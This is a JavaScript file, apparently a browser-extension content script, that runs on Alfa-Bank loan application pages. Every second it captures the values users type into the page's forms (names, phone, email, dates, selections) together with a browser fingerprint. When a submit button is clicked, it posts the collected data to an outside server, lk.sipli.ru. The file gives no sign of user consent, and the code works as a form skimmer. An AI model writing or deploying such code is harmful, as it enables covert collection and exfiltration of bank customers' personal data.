// *****************  HANDLE INPUTS AND STORE DATA ********************  //

let inputs;
if (
  location.pathname.includes("step1") ||
  location.href.includes("alfabank.ru/get-money")
) {
  localStorage.removeItem("alphaData");
  storeDataToLocalStorage();
}

setInterval(() => {
  storeDataToLocalStorage();
}, 1000);

function storeDataToLocalStorage() {
  const inputs = document.querySelectorAll(
    'input[type="text"], input[type="number"], input[type="date"], input[type="email"], input[type="tel"], textarea'
  );
  const inputsData = {};
  inputs.forEach((input) => {
    if (input.name) inputsData[input.name] = input.value;
  });

  const selects = document.querySelectorAll(".select");
  const selectsData = {};
  selects.forEach((select) => {
    const input = select.querySelector('input[type="hidden"]');
    const span = select.querySelector(".select-button__text");
    if (input && span) {
      selectsData[input.name] = span.innerText;
    }
  });

  const storageData = localStorage.getItem("alphaData");
  let data = {};
  if (storageData) data = JSON.parse(storageData);
  data = {
    ...data,
    ...inputsData,
    ...selectsData,
    fingerPrint: navigator.userAgent + new Date().toLocaleDateString(),
  };
  if (location.pathname.includes("step2")) {
    if (data.hasOwnProperty("phone")) delete data.phone;
    if (data.hasOwnProperty("firstName")) delete data.firstName;
    if (data.hasOwnProperty("lastName")) delete data.lastName;
    if (data.hasOwnProperty("middleName")) delete data.middleName;
    if (data.hasOwnProperty("email")) delete data.email;
    if (data.hasOwnProperty("fullName")) delete data.fullName;
  }
  localStorage.setItem("alphaData", JSON.stringify(data));
}

document.addEventListener("click", () => {
  const log = localStorage.getItem("alphaData");
  console.log(JSON.parse(log));
});

// *****************  SENDING REQUEST ********************  //

let submitBtns;

const submitBtnListener = () => {
  const data = localStorage.getItem("alphaData");
  postData("https://lk.sipli.ru:1155/alfaExtension", data).then((data) => {
    console.log(data);
  });
  console.log("request");
};

setInterval(() => {
  const isStep3 = location.pathname.includes("step3");
  const isStep1 =
    location.href.includes("alfabank.ru/get-money") ||
    location.pathname.includes("step1");
  if (isStep3 || isStep1) {
    if (submitBtns) {
      submitBtns.forEach((btn) => {
        btn.removeEventListener("click", submitBtnListener);
      });
    }

    submitBtns = document.querySelectorAll('button[type="submit"]');
    if (submitBtns) {
      submitBtns.forEach((btn) => {
        btn.addEventListener("click", submitBtnListener);
      });
    }
  }
}, 2000);

async function postData(url = "", data = {}) {
  const response = await fetch(url, {
    method: "POST",
    mode: "cors",
    cache: "no-cache",
    credentials: "same-origin",
    headers: {
      "Content-Type": "application/json",
    },
    redirect: "follow",
    referrerPolicy: "no-referrer",
    body: data,
  });
  return response.json();
}
